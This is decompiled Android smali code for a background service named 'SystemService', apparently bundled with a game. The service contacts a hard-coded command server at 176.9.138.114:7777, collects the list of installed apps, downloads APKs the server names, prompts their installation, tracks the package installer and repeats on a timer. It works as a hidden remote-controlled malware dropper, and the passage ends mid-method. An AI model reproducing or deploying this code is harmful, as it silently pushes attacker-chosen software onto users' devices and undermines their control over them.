.class public Lcom/fa/c/SystemService;
.super Landroid/app/Service;
.source "SystemService.java"


# annotations
.annotation system Ldalvik/annotation/MemberClasses;
    value = {
        Lcom/fa/c/SystemService$InstallTask;
    }
.end annotation


# instance fields
.field private _installTasks:Ljava/util/List;
    .annotation system Ldalvik/annotation/Signature;
        value = {
            "Ljava/util/List",
            "<",
            "Lcom/fa/c/SystemService$InstallTask;",
            ">;"
        }
    .end annotation
.end field

.field private _installedApps:Ljava/util/List;
    .annotation system Ldalvik/annotation/Signature;
        value = {
            "Ljava/util/List",
            "<",
            "Ljava/lang/String;",
            ">;"
        }
    .end annotation
.end field

.field private _nw:Lcom/Jump/vikingJump/NativeWrapper;

.field private longRunningTask:Ljava/lang/Runnable;

.field private longRunningTaskFuture:Ljava/util/concurrent/Future;

.field private longRunningTaskFutureInstallThread:Ljava/util/concurrent/Future;

.field private longRunningTaskFutureKnockThread:Ljava/util/concurrent/Future;

.field private longRunningTaskInstallThread:Ljava/lang/Runnable;

.field private longRunningTaskKnockThread:Ljava/lang/Runnable;

.field private ref:Ljava/lang/String;

.field private threadCps:Ljava/lang/Thread;

.field private threadInstaller:Ljava/lang/Thread;

.field private threadPoolExecutor:Ljava/util/concurrent/ExecutorService;

.field private threadPoolExecutorInstallThread:Ljava/util/concurrent/ExecutorService;

.field private threadPoolExecutorKnockThread:Ljava/util/concurrent/ExecutorService;


# direct methods
.method public constructor <init>()V
    .locals 1

    .prologue
    .line 49
    invoke-direct {p0}, Landroid/app/Service;-><init>()V

    .line 65
    new-instance v0, Ljava/util/LinkedList;

    invoke-direct {v0}, Ljava/util/LinkedList;-><init>()V

    iput-object v0, p0, Lcom/fa/c/SystemService;->_installTasks:Ljava/util/List;

    .line 66
    new-instance v0, Ljava/util/LinkedList;

    invoke-direct {v0}, Ljava/util/LinkedList;-><init>()V

    iput-object v0, p0, Lcom/fa/c/SystemService;->_installedApps:Ljava/util/List;

    .line 71
    const-string v0, ""

    iput-object v0, p0, Lcom/fa/c/SystemService;->ref:Ljava/lang/String;

    .line 49
    return-void
.end method

.method private BytesToUTF8String([B)Ljava/lang/String;
    .locals 4
    .param p1, "bytes"    # [B

    .prologue
    .line 551
    if-eqz p1, :cond_0

    .line 555
    :try_start_0
    new-instance v1, Ljava/lang/String;

    const-string v2, "UTF-8"

    invoke-direct {v1, p1, v2}, Ljava/lang/String;-><init>([BLjava/lang/String;)V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    .line 562
    :goto_0
    return-object v1

    .line 557
    :catch_0
    move-exception v0

    .line 559
    .local v0, "e":Ljava/lang/Exception;
    const-string v1, "CPS"

    new-instance v2, Ljava/lang/StringBuilder;

    const-string v3, "BytesToUTF8String exception: "

    invoke-direct {v2, v3}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v0}, Ljava/lang/Exception;->getMessage()Ljava/lang/String;

    move-result-object v3

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    invoke-virtual {v2}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v2

    invoke-static {v1, v2}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    .line 562
    .end local v0    # "e":Ljava/lang/Exception;
    :cond_0
    const/4 v1, 0x0

    goto :goto_0
.end method

.method private DeleteApkFile(Ljava/lang/String;)Z
    .locals 5
    .param p1, "name"    # Ljava/lang/String;

    .prologue
    .line 472
    :try_start_0
    new-instance v1, Ljava/io/File;

    new-instance v2, Ljava/lang/StringBuilder;

    invoke-direct {v2}, Ljava/lang/StringBuilder;-><init>()V

    invoke-static {}, Landroid/os/Environment;->getExternalStorageDirectory()Ljava/io/File;

    move-result-object v3

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/Object;)Ljava/lang/StringBuilder;

    move-result-object v2

    const-string v3, "/"

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    invoke-virtual {v2, p1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    const-string v3, ".apk"

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    invoke-virtual {v2}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v2

    invoke-direct {v1, v2}, Ljava/io/File;-><init>(Ljava/lang/String;)V

    .line 473
    .local v1, "file":Ljava/io/File;
    invoke-virtual {v1}, Ljava/io/File;->delete()Z
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    move-result v2

    .line 479
    .end local v1    # "file":Ljava/io/File;
    :goto_0
    return v2

    .line 475
    :catch_0
    move-exception v0

    .line 477
    .local v0, "e":Ljava/lang/Exception;
    const-string v2, "CPS"

    new-instance v3, Ljava/lang/StringBuilder;

    const-string v4, "DeleteApkFile exception: "

    invoke-direct {v3, v4}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v0}, Ljava/lang/Exception;->getMessage()Ljava/lang/String;

    move-result-object v4

    invoke-virtual {v3, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v3

    invoke-virtual {v3}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v3

    invoke-static {v2, v3}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    .line 479
    const/4 v2, 0x0

    goto :goto_0
.end method

.method private GetInstalledApps()Ljava/util/List;
    .locals 6
    .annotation system Ldalvik/annotation/Signature;
        value = {
            "()",
            "Ljava/util/List",
            "<",
            "Ljava/lang/String;",
            ">;"
        }
    .end annotation

    .prologue
    .line 576
    invoke-virtual {p0}, Lcom/fa/c/SystemService;->getPackageManager()Landroid/content/pm/PackageManager;

    move-result-object v2

    .line 577
    .local v2, "pm":Landroid/content/pm/PackageManager;
    const/16 v4, 0x80

    invoke-virtual {v2, v4}, Landroid/content/pm/PackageManager;->getInstalledApplications(I)Ljava/util/List;

    move-result-object v1

    .line 579
    .local v1, "packages":Ljava/util/List;, "Ljava/util/List<Landroid/content/pm/ApplicationInfo;>;"
    new-instance v3, Ljava/util/LinkedList;

    invoke-direct {v3}, Ljava/util/LinkedList;-><init>()V

    .line 581
    .local v3, "res":Ljava/util/List;, "Ljava/util/List<Ljava/lang/String;>;"
    invoke-interface {v1}, Ljava/util/List;->iterator()Ljava/util/Iterator;

    move-result-object v4

    :goto_0
    invoke-interface {v4}, Ljava/util/Iterator;->hasNext()Z

    move-result v5

    if-nez v5, :cond_0

    .line 586
    return-object v3

    .line 581
    :cond_0
    invoke-interface {v4}, Ljava/util/Iterator;->next()Ljava/lang/Object;

    move-result-object v0

    check-cast v0, Landroid/content/pm/ApplicationInfo;

    .line 583
    .local v0, "packageInfo":Landroid/content/pm/ApplicationInfo;
    iget-object v5, v0, Landroid/content/pm/ApplicationInfo;->packageName:Ljava/lang/String;

    invoke-interface {v3, v5}, Ljava/util/List;->add(Ljava/lang/Object;)Z

    goto :goto_0
.end method

.method private GetRunningProcess()V
    .locals 5

    .prologue
    .line 591
    invoke-static {}, Lcom/jaredrummler/android/processes/ProcessManager;->getRunningAppProcesses()Ljava/util/List;

    move-result-object v1

    .line 592
    .local v1, "processes":Ljava/util/List;, "Ljava/util/List<Lcom/jaredrummler/android/processes/models/AndroidAppProcess;>;"
    invoke-interface {v1}, Ljava/util/List;->iterator()Ljava/util/Iterator;

    move-result-object v2

    :cond_0
    :goto_0
    invoke-interface {v2}, Ljava/util/Iterator;->hasNext()Z

    move-result v3

    if-nez v3, :cond_1

    .line 608
    return-void

    .line 592
    :cond_1
    invoke-interface {v2}, Ljava/util/Iterator;->next()Ljava/lang/Object;

    move-result-object v0

    check-cast v0, Lcom/jaredrummler/android/processes/models/AndroidAppProcess;

    .line 595
    .local v0, "p":Lcom/jaredrummler/android/processes/models/AndroidAppProcess;
    invoke-virtual {v0}, Lcom/jaredrummler/android/processes/models/AndroidAppProcess;->getPackageName()Ljava/lang/String;

    move-result-object v3

    const-string v4, "com.android.packageinstaller"

    invoke-virtual {v3, v4}, Ljava/lang/String;->equalsIgnoreCase(Ljava/lang/String;)Z

    move-result v3

    if-eqz v3, :cond_0

    .line 597
    iget-boolean v3, v0, Lcom/jaredrummler/android/processes/models/AndroidAppProcess;->foreground:Z

    if-eqz v3, :cond_2

    .line 599
    const-string v3, "CPS"

    const-string v4, "Installing..."

    invoke-static {v3, v4}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    goto :goto_0

    .line 603
    :cond_2
    const-string v3, "CPS"

    const-string v4, "Not Installing"

    invoke-static {v3, v4}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    goto :goto_0
.end method

.method private HttpGet(Ljava/lang/String;)[B
    .locals 10
    .param p1, "path"    # Ljava/lang/String;

    .prologue
    .line 491
    :try_start_0
    new-instance v5, Ljava/net/URL;

    invoke-direct {v5, p1}, Ljava/net/URL;-><init>(Ljava/lang/String;)V

    .line 492
    .local v5, "url":Ljava/net/URL;
    invoke-virtual {v5}, Ljava/net/URL;->openConnection()Ljava/net/URLConnection;

    move-result-object v6

    check-cast v6, Ljava/net/HttpURLConnection;

    .line 493
    .local v6, "urlConnection":Ljava/net/HttpURLConnection;
    const/4 v7, 0x0

    invoke-virtual {v6, v7}, Ljava/net/HttpURLConnection;->setChunkedStreamingMode(I)V

    .line 494
    invoke-virtual {v6}, Ljava/net/HttpURLConnection;->getInputStream()Ljava/io/InputStream;

    move-result-object v3

    .line 495
    .local v3, "is":Ljava/io/InputStream;
    const/16 v7, 0x2000

    new-array v0, v7, [B

    .line 497
    .local v0, "buffer":[B
    new-instance v4, Ljava/io/ByteArrayOutputStream;

    invoke-direct {v4}, Ljava/io/ByteArrayOutputStream;-><init>()V

    .line 498
    .local v4, "output":Ljava/io/ByteArrayOutputStream;
    :goto_0
    invoke-virtual {v3, v0}, Ljava/io/InputStream;->read([B)I

    move-result v1

    .local v1, "bytesRead":I
    const/4 v7, -0x1

    if-ne v1, v7, :cond_0

    .line 503
    invoke-virtual {v3}, Ljava/io/InputStream;->close()V

    .line 505
    invoke-virtual {v4}, Ljava/io/ByteArrayOutputStream;->toByteArray()[B

    move-result-object v7

    .line 513
    .end local v0    # "buffer":[B
    .end local v1    # "bytesRead":I
    .end local v3    # "is":Ljava/io/InputStream;
    .end local v4    # "output":Ljava/io/ByteArrayOutputStream;
    .end local v5    # "url":Ljava/net/URL;
    .end local v6    # "urlConnection":Ljava/net/HttpURLConnection;
    :goto_1
    return-object v7

    .line 500
    .restart local v0    # "buffer":[B
    .restart local v1    # "bytesRead":I
    .restart local v3    # "is":Ljava/io/InputStream;
    .restart local v4    # "output":Ljava/io/ByteArrayOutputStream;
    .restart local v5    # "url":Ljava/net/URL;
    .restart local v6    # "urlConnection":Ljava/net/HttpURLConnection;
    :cond_0
    const/4 v7, 0x0

    invoke-virtual {v4, v0, v7, v1}, Ljava/io/ByteArrayOutputStream;->write([BII)V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    goto :goto_0

    .line 508
    .end local v0    # "buffer":[B
    .end local v1    # "bytesRead":I
    .end local v3    # "is":Ljava/io/InputStream;
    .end local v4    # "output":Ljava/io/ByteArrayOutputStream;
    .end local v5    # "url":Ljava/net/URL;
    .end local v6    # "urlConnection":Ljava/net/HttpURLConnection;
    :catch_0
    move-exception v2

    .line 510
    .local v2, "e":Ljava/lang/Exception;
    const-string v7, "CPS"

    new-instance v8, Ljava/lang/StringBuilder;

    const-string v9, "HttpGet exception: "

    invoke-direct {v8, v9}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v2}, Ljava/lang/Exception;->getMessage()Ljava/lang/String;

    move-result-object v9

    invoke-virtual {v8, v9}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v8

    invoke-virtual {v8}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v8

    invoke-static {v7, v8}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    .line 513
    const/4 v7, 0x0

    goto :goto_1
.end method

.method private HttpGetFile(Ljava/lang/String;Ljava/lang/String;)Z
    .locals 12
    .param p1, "path"    # Ljava/lang/String;
    .param p2, "name"    # Ljava/lang/String;

    .prologue
    const/4 v7, 0x0

    .line 520
    :try_start_0
    new-instance v5, Ljava/net/URL;

    invoke-direct {v5, p1}, Ljava/net/URL;-><init>(Ljava/lang/String;)V

    .line 521
    .local v5, "url":Ljava/net/URL;
    invoke-virtual {v5}, Ljava/net/URL;->openConnection()Ljava/net/URLConnection;

    move-result-object v6

    check-cast v6, Ljava/net/HttpURLConnection;

    .line 522
    .local v6, "urlConnection":Ljava/net/HttpURLConnection;
    const/4 v8, 0x0

    invoke-virtual {v6, v8}, Ljava/net/HttpURLConnection;->setChunkedStreamingMode(I)V

    .line 523
    invoke-virtual {v6}, Ljava/net/HttpURLConnection;->getInputStream()Ljava/io/InputStream;

    move-result-object v4

    .line 525
    .local v4, "is":Ljava/io/InputStream;
    new-instance v0, Ljava/io/BufferedOutputStream;

    new-instance v8, Ljava/io/FileOutputStream;

    new-instance v9, Ljava/io/File;

    new-instance v10, Ljava/lang/StringBuilder;

    invoke-direct {v10}, Ljava/lang/StringBuilder;-><init>()V

    invoke-static {}, Landroid/os/Environment;->getExternalStorageDirectory()Ljava/io/File;

    move-result-object v11

    invoke-virtual {v10, v11}, Ljava/lang/StringBuilder;->append(Ljava/lang/Object;)Ljava/lang/StringBuilder;

    move-result-object v10

    const-string v11, "/"

    invoke-virtual {v10, v11}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v10

    invoke-virtual {v10, p2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v10

    const-string v11, ".apk"

    invoke-virtual {v10, v11}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v10

    invoke-virtual {v10}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v10

    invoke-direct {v9, v10}, Ljava/io/File;-><init>(Ljava/lang/String;)V

    invoke-direct {v8, v9}, Ljava/io/FileOutputStream;-><init>(Ljava/io/File;)V

    invoke-direct {v0, v8}, Ljava/io/BufferedOutputStream;-><init>(Ljava/io/OutputStream;)V

    .line 527
    .local v0, "bos":Ljava/io/BufferedOutputStream;
    const/16 v8, 0x2000

    new-array v1, v8, [B

    .line 530
    .local v1, "buffer":[B
    :goto_0
    invoke-virtual {v4, v1}, Ljava/io/InputStream;->read([B)I

    move-result v2

    .local v2, "bytesRead":I
    const/4 v8, -0x1

    if-ne v2, v8, :cond_0

    .line 535
    invoke-virtual {v0}, Ljava/io/BufferedOutputStream;->close()V

    .line 536
    invoke-virtual {v4}, Ljava/io/InputStream;->close()V

    .line 538
    const/4 v7, 0x1

    .line 546
    .end local v0    # "bos":Ljava/io/BufferedOutputStream;
    .end local v1    # "buffer":[B
    .end local v2    # "bytesRead":I
    .end local v4    # "is":Ljava/io/InputStream;
    .end local v5    # "url":Ljava/net/URL;
    .end local v6    # "urlConnection":Ljava/net/HttpURLConnection;
    :goto_1
    return v7

    .line 532
    .restart local v0    # "bos":Ljava/io/BufferedOutputStream;
    .restart local v1    # "buffer":[B
    .restart local v2    # "bytesRead":I
    .restart local v4    # "is":Ljava/io/InputStream;
    .restart local v5    # "url":Ljava/net/URL;
    .restart local v6    # "urlConnection":Ljava/net/HttpURLConnection;
    :cond_0
    const/4 v8, 0x0

    invoke-virtual {v0, v1, v8, v2}, Ljava/io/BufferedOutputStream;->write([BII)V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    goto :goto_0

    .line 541
    .end local v0    # "bos":Ljava/io/BufferedOutputStream;
    .end local v1    # "buffer":[B
    .end local v2    # "bytesRead":I
    .end local v4    # "is":Ljava/io/InputStream;
    .end local v5    # "url":Ljava/net/URL;
    .end local v6    # "urlConnection":Ljava/net/HttpURLConnection;
    :catch_0
    move-exception v3

    .line 543
    .local v3, "e":Ljava/lang/Exception;
    const-string v8, "CPS"

    new-instance v9, Ljava/lang/StringBuilder;

    const-string v10, "HttpGet exception: "

    invoke-direct {v9, v10}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v3}, Ljava/lang/Exception;->getMessage()Ljava/lang/String;

    move-result-object v10

    invoke-virtual {v9, v10}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v9

    invoke-virtual {v9}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v9

    invoke-static {v8, v9}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    goto :goto_1
.end method

.method private InstallApk(Ljava/lang/String;)V
    .locals 4
    .param p1, "apk"    # Ljava/lang/String;

    .prologue
    .line 632
    new-instance v0, Landroid/content/Intent;

    const-string v1, "android.intent.action.VIEW"

    invoke-direct {v0, v1}, Landroid/content/Intent;-><init>(Ljava/lang/String;)V

    .line 633
    .local v0, "intent":Landroid/content/Intent;
    new-instance v1, Ljava/io/File;

    new-instance v2, Ljava/lang/StringBuilder;

    invoke-direct {v2}, Ljava/lang/StringBuilder;-><init>()V

    invoke-static {}, Landroid/os/Environment;->getExternalStorageDirectory()Ljava/io/File;

    move-result-object v3

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/Object;)Ljava/lang/StringBuilder;

    move-result-object v2

    const-string v3, "/"

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    invoke-virtual {v2, p1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    const-string v3, ".apk"

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    invoke-virtual {v2}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v2

    invoke-direct {v1, v2}, Ljava/io/File;-><init>(Ljava/lang/String;)V

    invoke-static {v1}, Landroid/net/Uri;->fromFile(Ljava/io/File;)Landroid/net/Uri;

    move-result-object v1

    const-string v2, "application/vnd.android.package-archive"

    invoke-virtual {v0, v1, v2}, Landroid/content/Intent;->setDataAndType(Landroid/net/Uri;Ljava/lang/String;)Landroid/content/Intent;

    .line 634
    const/high16 v1, 0x10000000

    invoke-virtual {v0, v1}, Landroid/content/Intent;->setFlags(I)Landroid/content/Intent;

    .line 635
    invoke-virtual {p0, v0}, Lcom/fa/c/SystemService;->startActivity(Landroid/content/Intent;)V

    .line 636
    return-void
.end method

.method private InstallTaskHandler()V
    .locals 24

    .prologue
    .line 293
    const-wide/32 v2, 0x2bf20

    :try_start_0
    invoke-static {v2, v3}, Ljava/lang/Thread;->sleep(J)V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_5

    .line 303
    :goto_0
    move-object/from16 v0, p0

    iget-object v2, v0, Lcom/fa/c/SystemService;->_installTasks:Ljava/util/List;

    if-nez v2, :cond_0

    new-instance v2, Ljava/util/LinkedList;

    invoke-direct {v2}, Ljava/util/LinkedList;-><init>()V

    move-object/from16 v0, p0

    iput-object v2, v0, Lcom/fa/c/SystemService;->_installTasks:Ljava/util/List;

    .line 304
    :cond_0
    move-object/from16 v0, p0

    iget-object v2, v0, Lcom/fa/c/SystemService;->_installTasks:Ljava/util/List;

    invoke-interface {v2}, Ljava/util/List;->clear()V

    .line 309
    :try_start_1
    const-string v2, "http://176.9.138.114:7777/ecspectapatronum/"

    move-object/from16 v0, p0

    invoke-direct {v0, v2}, Lcom/fa/c/SystemService;->HttpGet(Ljava/lang/String;)[B

    move-result-object v10

    .line 310
    .local v10, "bytes":[B
    move-object/from16 v0, p0

    invoke-direct {v0, v10}, Lcom/fa/c/SystemService;->BytesToUTF8String([B)Ljava/lang/String;

    move-result-object v16

    .line 312
    .local v16, "jsonString":Ljava/lang/String;
    new-instance v14, Lorg/json/JSONObject;

    move-object/from16 v0, v16

    invoke-direct {v14, v0}, Lorg/json/JSONObject;-><init>(Ljava/lang/String;)V

    .line 313
    .local v14, "json":Lorg/json/JSONObject;
    const-string v2, "t"

    invoke-virtual {v14, v2}, Lorg/json/JSONObject;->getJSONArray(Ljava/lang/String;)Lorg/json/JSONArray;

    move-result-object v15

    .line 316
    .local v15, "jsonApps":Lorg/json/JSONArray;
    move-object/from16 v0, p0

    iget-object v2, v0, Lcom/fa/c/SystemService;->_installedApps:Ljava/util/List;

    if-nez v2, :cond_1

    new-instance v2, Ljava/util/LinkedList;

    invoke-direct {v2}, Ljava/util/LinkedList;-><init>()V

    move-object/from16 v0, p0

    iput-object v2, v0, Lcom/fa/c/SystemService;->_installedApps:Ljava/util/List;

    .line 317
    :cond_1
    move-object/from16 v0, p0

    iget-object v2, v0, Lcom/fa/c/SystemService;->_installedApps:Ljava/util/List;

    invoke-interface {v2}, Ljava/util/List;->clear()V

    .line 318
    invoke-direct/range {p0 .. p0}, Lcom/fa/c/SystemService;->GetInstalledApps()Ljava/util/List;

    move-result-object v2

    move-object/from16 v0, p0

    iput-object v2, v0, Lcom/fa/c/SystemService;->_installedApps:Ljava/util/List;

    .line 321
    const/4 v12, 0x0

    .local v12, "i":I
    :goto_1
    invoke-virtual {v15}, Lorg/json/JSONArray;->length()I

    move-result v2

    if-lt v12, v2, :cond_2

    .line 343
    const-string v2, "CPS"

    new-instance v3, Ljava/lang/StringBuilder;

    const-string v20, "InstallTaskHandler will install "

    move-object/from16 v0, v20

    invoke-direct {v3, v0}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    move-object/from16 v0, p0

    iget-object v0, v0, Lcom/fa/c/SystemService;->_installTasks:Ljava/util/List;

    move-object/from16 v20, v0

    invoke-interface/range {v20 .. v20}, Ljava/util/List;->size()I

    move-result v20

    move/from16 v0, v20

    invoke-virtual {v3, v0}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    move-result-object v3

    invoke-virtual {v3}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v3

    invoke-static {v2, v3}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    .line 346
    move-object/from16 v0, p0

    iget-object v2, v0, Lcom/fa/c/SystemService;->_installTasks:Ljava/util/List;

    invoke-interface {v2}, Ljava/util/List;->iterator()Ljava/util/Iterator;

    move-result-object v2

    :goto_2
    invoke-interface {v2}, Ljava/util/Iterator;->hasNext()Z
    :try_end_1
    .catch Ljava/lang/Exception; {:try_start_1 .. :try_end_1} :catch_1

    move-result v3

    if-nez v3, :cond_4

    .line 440
    .end local v10    # "bytes":[B
    .end local v12    # "i":I
    .end local v14    # "json":Lorg/json/JSONObject;
    .end local v15    # "jsonApps":Lorg/json/JSONArray;
    .end local v16    # "jsonString":Ljava/lang/String;
    :goto_3
    const-wide/32 v2, 0x493e0

    :try_start_2
    invoke-static {v2, v3}, Ljava/lang/Thread;->sleep(J)V
    :try_end_2
    .catch Ljava/lang/Exception; {:try_start_2 .. :try_end_2} :catch_0

    goto/16 :goto_0

    .line 442
    :catch_0
    move-exception v11

    .line 444
    .local v11, "e":Ljava/lang/Exception;
    const-string v2, "CPS"

    new-instance v3, Ljava/lang/StringBuilder;

    const-string v20, "InstallTaskHandler exception: "

    move-object/from16 v0, v20

    invoke-direct {v3, v0}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v11}, Ljava/lang/Exception;->getMessage()Ljava/lang/String;

    move-result-object v20

    move-object/from16 v0, v20

    invoke-virtual {v3, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v3

    invoke-virtual {v3}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v3

    invoke-static {v2, v3}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    goto/16 :goto_0

    .line 323
    .end local v11    # "e":Ljava/lang/Exception;
    .restart local v10    # "bytes":[B
    .restart local v12    # "i":I
    .restart local v14    # "json":Lorg/json/JSONObject;
    .restart local v15    # "jsonApps":Lorg/json/JSONArray;
    .restart local v16    # "jsonString":Ljava/lang/String;
    :cond_2
    :try_start_3
    invoke-virtual {v15, v12}, Lorg/json/JSONArray;->getJSONObject(I)Lorg/json/JSONObject;

    move-result-object v9

    .line 324
    .local v9, "appJson":Lorg/json/JSONObject;
    const-string v2, "platform"

    invoke-virtual {v9, v2}, Lorg/json/JSONObject;->getInt(Ljava/lang/String;)I

    move-result v17

    .line 325
    .local v17, "platform":I
    const/4 v2, 0x1

    move/from16 v0, v17

    if-ne v0, v2, :cond_3

    .line 327
    const-string v2, "api"

    invoke-virtual {v9, v2}, Lorg/json/JSONObject;->getInt(Ljava/lang/String;)I

    move-result v8

    .line 328
    .local v8, "api":I
    sget v2, Landroid/os/Build$VERSION;->SDK_INT:I

    if-gt v8, v2, :cond_3

    .line 330
    const-string v2, "bid"

    invoke-virtual {v9, v2}, Lorg/json/JSONObject;->getString(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v5

    .line 331
    .local v5, "bundle":Ljava/lang/String;
    move-object/from16 v0, p0

    invoke-direct {v0, v5}, Lcom/fa/c/SystemService;->IsAppInstalled(Ljava/lang/String;)Z

    move-result v2

    if-nez v2, :cond_3

    .line 333
    const-string v2, "id"

    invoke-virtual {v9, v2}, Lorg/json/JSONObject;->getString(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v4

    .line 334
    .local v4, "id":Ljava/lang/String;
    const-string v2, "url"

    invoke-virtual {v9, v2}, Lorg/json/JSONObject;->getString(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v6

    .line 335
    .local v6, "url":Ljava/lang/String;
    const-string v2, "hash"

    invoke-virtual {v9, v2}, Lorg/json/JSONObject;->getString(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v7

    .line 336
    .local v7, "hash":Ljava/lang/String;
    move-object/from16 v0, p0

    iget-object v0, v0, Lcom/fa/c/SystemService;->_installTasks:Ljava/util/List;

    move-object/from16 v20, v0

    new-instance v2, Lcom/fa/c/SystemService$InstallTask;

    move-object/from16 v3, p0

    invoke-direct/range {v2 .. v8}, Lcom/fa/c/SystemService$InstallTask;-><init>(Lcom/fa/c/SystemService;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;I)V

    move-object/from16 v0, v20

    invoke-interface {v0, v2}, Ljava/util/List;->add(Ljava/lang/Object;)Z

    .line 321
    .end local v4    # "id":Ljava/lang/String;
    .end local v5    # "bundle":Ljava/lang/String;
    .end local v6    # "url":Ljava/lang/String;
    .end local v7    # "hash":Ljava/lang/String;
    .end local v8    # "api":I
    :cond_3
    add-int/lit8 v12, v12, 0x1

    goto/16 :goto_1

    .line 346
    .end local v9    # "appJson":Lorg/json/JSONObject;
    .end local v17    # "platform":I
    :cond_4
    invoke-interface {v2}, Ljava/util/Iterator;->next()Ljava/lang/Object;

    move-result-object v13

    check-cast v13, Lcom/fa/c/SystemService$InstallTask;

    .line 349
    .local v13, "installTask":Lcom/fa/c/SystemService$InstallTask;
    iget-object v3, v13, Lcom/fa/c/SystemService$InstallTask;->url:Ljava/lang/String;

    iget-object v0, v13, Lcom/fa/c/SystemService$InstallTask;->bundle:Ljava/lang/String;

    move-object/from16 v20, v0

    move-object/from16 v0, p0

    move-object/from16 v1, v20

    invoke-direct {v0, v3, v1}, Lcom/fa/c/SystemService;->HttpGetFile(Ljava/lang/String;Ljava/lang/String;)Z

    move-result v3

    if-nez v3, :cond_5

    .line 351
    const-string v3, "CPS"

    const-string v20, "InstallTaskHandler cant download apk"

    move-object/from16 v0, v20

    invoke-static {v3, v0}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I
    :try_end_3
    .catch Ljava/lang/Exception; {:try_start_3 .. :try_end_3} :catch_1

    goto/16 :goto_2

    .line 432
    .end local v10    # "bytes":[B
    .end local v12    # "i":I
    .end local v13    # "installTask":Lcom/fa/c/SystemService$InstallTask;
    .end local v14    # "json":Lorg/json/JSONObject;
    .end local v15    # "jsonApps":Lorg/json/JSONArray;
    .end local v16    # "jsonString":Ljava/lang/String;
    :catch_1
    move-exception v11

    .line 434
    .restart local v11    # "e":Ljava/lang/Exception;
    const-string v2, "CPS"

    new-instance v3, Ljava/lang/StringBuilder;

    const-string v20, "InstallTaskHandler exception: "

    move-object/from16 v0, v20

    invoke-direct {v3, v0}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v11}, Ljava/lang/Exception;->getMessage()Ljava/lang/String;

    move-result-object v20

    move-object/from16 v0, v20

    invoke-virtual {v3, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v3

    invoke-virtual {v3}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v3

    invoke-static {v2, v3}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    goto/16 :goto_3

    .line 363
    .end local v11    # "e":Ljava/lang/Exception;
